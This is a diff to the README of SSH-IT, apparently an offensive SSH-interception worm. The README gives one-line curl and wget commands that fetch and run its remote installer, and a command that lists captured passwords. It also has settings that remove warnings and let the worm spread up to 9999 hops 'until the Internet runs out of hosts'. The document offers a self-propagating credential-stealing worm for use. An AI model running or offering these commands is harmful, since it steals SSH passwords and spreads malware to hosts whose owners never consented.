@@ -10,15 +10,23 @@ bash -c "$(curl -fsSL ssh-it.thc.org/x)"
 bash -c "$(wget --no-verbose -O- ssh-it.thc.org/x)"
 ```
 
+{:refdef: style="text-align: center;"}
+![Deploy-Example](deploy-example2.png)
+{: refdef}
+
+To show all captured passwords use:
+```
+~/.prng/thc_ctl -r list
+```
+{:refdef: style="text-align: center;"}
+![Deploy-Example](list-example.png)
+{: refdef}
+
+
 To uninstall use:
 ```
-thc_ctl clean
+~/.prng/thc_ctl -r uninstall
 ```
-
-Screenshot
-{:refdef: style="text-align: center;"}
-![Deploy-Example](deploy-example.jpg)
-{: refdef}
 
 ### ALPHA TESTING
 
@@ -29,12 +37,16 @@ ALPHA DEFAULT SETTINGS:
 * ```THC_VERBOSE=1``` You will see a warning when *ssh* is being intercepted.
 * ```THC_DEPTH=2``` The worm will stop spreading 2 hops from the host where it got deployed.
 
-Take off all safety and run SSH-IT in release mode like this:
+{:refdef: style="text-align: center;"}
+![Deploy-Example](verbose-example.png)
+{: refdef}
+
+Take off all safety and run SSH-IT in release mode (*with no warnings*):
 ```shell
 THC_NO_CONDOME=1 bash -c "$(curl -fsSL ssh-it.thc.org/x)"
 ```
 
-Or go totally bonkers and own the Internet:
+Or go bonkers and let the worm run until the Internet runs out of hosts:
 ```shell
 THC_DEPTH=9999 THC_NO_CONDOME=1 bash -c "$(curl -fsSL ssh-it.thc.org/x)"
 ```
